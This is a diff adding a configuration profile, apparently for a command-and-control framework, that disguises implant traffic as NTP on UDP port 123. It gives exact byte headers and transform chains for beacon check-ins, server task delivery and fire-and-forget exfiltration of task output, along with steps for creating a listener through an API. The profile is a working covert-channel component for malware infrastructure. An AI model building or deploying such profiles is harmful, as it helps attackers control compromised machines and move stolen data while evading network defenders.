@@ -1,0 +1,111 @@
+[profile]
+name = "NTP Mimicry"
+author = "LongHaul Team"
+
+# ==========================================================================
+# RAW - NTP Protocol Mimicry (RFC 5905, UDP port 123)
+# ==========================================================================
+#
+# Usage:
+#   1. Create a raw listener: POST /api/v1/listeners with
+#        listener_type = "raw"
+#        listener_port = 123  (or any port you prefer for testing)
+#        listener_profile_contents = <contents of this file>
+#
+# Wire format — client to server (both GET and POST):
+#
+#   [48-byte NTP header per RFC 5905 §7.3]
+#   [4-byte private extension field header per RFC 5905 §7.5]
+#   [base64url-encoded msgpack payload — no padding]
+#
+#   GET uses extension field type 0xF001 (private, beacon)
+#   POST uses extension field type 0xF002 (private, exfil)
+#   Server response uses extension field type 0xF003 (private, task delivery)
+#
+# NTP header layout (48 bytes):
+#   Byte 0:     LI=0 (no leap warning), VN=4 (NTPv4), Mode=3 (client) → 0x23
+#   Byte 1:     Stratum=0  (unspecified; correct for client requests)
+#   Byte 2:     Poll=6     (2^6 = 64-second polling interval)
+#   Byte 3:     Precision=-20  (2^-20 ≈ 1µs resolution → 0xEC as signed byte)
+#   Bytes  4-7: Root Delay=0
+#   Bytes  8-11: Root Dispersion=0
+#   Bytes 12-15: Reference Identifier=0  (unset in client requests)
+#   Bytes 16-47: Reference/Origin/Receive/Transmit Timestamps = 0
+#                (RFC 5905 §8 — Transmit Timestamp should be current time,
+#                 but we use 0 per the user's "no exact time required" constraint)
+#
+# Extension field layout (4 bytes, RFC 5905 §7.5):
+#   Bytes 0-1:  Field Type (0xF001/0xF002/0xF003 — private use)
+#   Bytes 2-3:  Length=4  (minimum; covers only the 4-byte header)
+#               NOTE: the length field is intentionally minimal — the
+#               base64 data technically extends beyond the declared length.
+#               A strict RFC 5905 implementation would set Length to include
+#               the full payload, but since our server is the consumer,
+#               this simplified encoding is safe for testing.
+#
+# NOTE on ICMP: ICMP mimicry (RFC 792) requires raw IP sockets (SOCK_RAW /
+# IPPROTO_ICMP), which need elevated privileges (root / Administrator) on both
+# the implant AND listener sides. The raw listener currently supports only TCP
+# and UDP. Add proto = "icmp" support when raw socket handling lands.
+# ==========================================================================
+
+
+# --------------------------------------------------------------------------
+# GET — Beacon check-in (implant → server)
+# --------------------------------------------------------------------------
+[raw.get]
+proto = "udp"
+body = "<METADATA>"
+
+[raw.get.client.metadata]
+# Transform chain applied to msgpack beacon metadata before wire send:
+#   1. base64url-encode  →  URL-safe ASCII, no padding
+#   2. prepend 52-byte NTP client request header + extension field (type 0xF001)
+#
+# On receive, the server reverses this chain in order (prepend undone first,
+# then base64url-decoded) to recover the raw msgpack.
+transforms = [
+    { op = "base64url" },
+    { op = "prepend", val = '\x23\x00\x06\xEC\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xF0\x01\x00\x04' }
+]
+
+[raw.get.server]
+body = "<OUTPUT>"
+
+[raw.get.server.output]
+# Transform chain applied to task bytes before the server sends them back:
+#   1. base64url-encode
+#   2. prepend 52-byte NTP server reply header + extension field (type 0xF003)
+#      Server header: LI=0, VN=4, Mode=4 (server), Stratum=1, Poll=6, Precision=-20
+#      Reference ID = "LOCL" (0x4C 0x4F 0x43 0x4C) — local clock
+#
+# The implant reverses this chain on receive to extract the raw task bytes.
+# If no tasks are pending, the server sends nothing (UDP timeout on implant side).
+transforms = [
+    { op = "base64url" },
+    { op = "prepend", val = '\x24\x01\x06\xEC\x00\x00\x00\x00\x00\x00\x00\x00\x4C\x4F\x43\x4C\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xF0\x03\x00\x04' }
+]
+
+
+# --------------------------------------------------------------------------
+# POST — Task exfil (implant → server)
+# --------------------------------------------------------------------------
+[raw.post]
+proto = "udp"
+body = "<OUTPUT>"
+
+[raw.post.client.output]
+# Transform chain applied to msgpack exfil payload before wire send:
+#   1. base64url-encode
+#   2. prepend same 48-byte NTP client request header + extension type 0xF002
+#      (extension type differs from GET's 0xF001 for wire-level clarity,
+#      though disambiguation on the server is handled by msgpack structure)
+transforms = [
+    { op = "base64url" },
+    { op = "prepend", val = '\x23\x00\x06\xEC\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xF0\x02\x00\x04' }
+]
+
+[raw.post.server]
+# No ACK: real NTP servers don't respond to a second packet in the same exchange.
+# Implant fires the exfil packet and moves on (fire-and-forget).
+body = ""
